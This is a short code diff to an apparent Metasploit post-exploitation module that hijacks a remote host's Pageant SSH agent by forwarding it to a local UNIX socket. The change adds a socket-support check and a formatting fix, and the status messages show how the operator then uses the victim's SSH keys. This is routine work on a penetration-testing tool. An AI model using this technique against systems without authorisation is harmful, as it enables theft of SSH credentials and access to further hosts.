@@ -39,6 +39,15 @@ class Metasploit3 < Msf::Post
   end
 
   def run
+
+    # Check to ensure that UNIX sockets are supported
+    begin
+      ::UNIXServer
+    rescue NameError
+      print_error("This module is only supported on a Metasploit installation that supports UNIX sockets.")
+      return false
+    end
+
     # Attempt to load the pageantjacker extension if it isn't already loaded.
     unless session.pageantjacker
       print_status("Loading PageantJacker extension on session #{session.sid} (#{session.session_host})")
@@ -65,7 +74,7 @@ class Metasploit3 < Msf::Post
     end
 
     # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
-    ::UNIXServer.open(@sockpath) do|serv|
+    ::UNIXServer.open(@sockpath) do |serv|
       print_status("Launched listening socket on #{@sockpath}")
       print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
       print_status("Now use any tool normally (e.g. ssh-add)")
@@ -92,4 +101,5 @@ class Metasploit3 < Msf::Post
     # Remove the socket that we created, if it still exists
     ::File.delete(@sockpath) if ::File.exist?(@sockpath) if @sockpath
   end
+
 end
